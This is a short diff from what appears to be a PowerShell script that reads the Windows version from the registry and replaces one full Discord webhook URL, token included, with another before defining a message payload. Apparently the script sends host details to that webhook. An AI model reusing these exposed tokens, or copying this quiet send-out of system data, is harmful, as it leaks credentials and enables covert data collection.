@@ -12,7 +12,7 @@ $osVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Curren
 sleep 2
 
 # Define the Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1285282939239927849/BNsmidplEg4Azwj9_Fy7g4pAXIfhGmcFM3k3HiNtdWnIODC4-c2LFiKsOg4Pe_nPc5yd"
+$webhookUrl = "https://discord.com/api/webhooks/1285342842637652051/GSOdvbr6eGLXNfPvRbz084u0YKKe87_OvE5wdKJY_O3cZasfuBfj4nvXmbLTmfVQ-NDw"
 
 # Define the message payload
 $payload = @{
